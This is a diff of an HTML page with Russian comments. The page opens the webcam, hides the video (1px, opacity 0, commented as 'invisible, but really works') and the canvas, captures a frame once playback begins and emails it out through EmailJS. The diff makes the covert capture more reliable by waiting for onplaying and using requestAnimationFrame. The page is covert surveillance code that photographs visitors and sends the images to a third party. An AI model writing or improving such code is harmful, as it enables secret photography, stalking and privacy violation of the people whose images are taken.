@@ -16,10 +16,10 @@
       overflow: hidden;
     }
     video {
-      position: absolute;
       width: 1px;
       height: 1px;
-      opacity: 0; /* видео невидимо, но работает */
+      opacity: 0; /* невидимое, но реально работает */
+      position: absolute;
     }
     canvas {
       display: none;
@@ -32,15 +32,15 @@
 
   <script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
   <script>
-    emailjs.init("ТВОЙ_USER_ID");
+    emailjs.init("ТВОЙ_USER_ID"); // замените на свой User ID
 
     function sendPhoto(photoUrl) {
       emailjs.send('service_zv13ydk', 'ТВОЙ_TEMPLATE_ID', {
         time: new Date().toLocaleString(),
         photo_link: photoUrl
       })
-      .then(response => console.log('Письмо отправлено!'))
-      .catch(error => console.error('Ошибка отправки:', error));
+      .then(() => console.log('Письмо отправлено!'))
+      .catch(err => console.error('Ошибка отправки:', err));
     }
 
     const video = document.getElementById('video');
@@ -51,21 +51,20 @@
       .then(stream => {
         video.srcObject = stream;
 
-        video.onloadedmetadata = () => {
-          video.play();
-
-          // Подстраиваем canvas под видео
+        // Ждём, пока видео реально готово к воспроизведению
+        video.onplaying = () => {
+          // Подстраиваем canvas под размер видео
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
 
-          // Делаем фото после небольшой задержки
-          setTimeout(() => {
+          // Используем requestAnimationFrame, чтобы точно поймать первый кадр
+          requestAnimationFrame(() => {
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const photoData = canvas.toDataURL('image/png');
             console.log('Фото сделано:', photoData);
 
-            sendPhoto(photoData);
-          }, 500);
+            sendPhoto(photoData); // Отправка на почту
+          });
         };
       })
       .catch(err => alert("Ошибка доступа к камере: " + err.message));
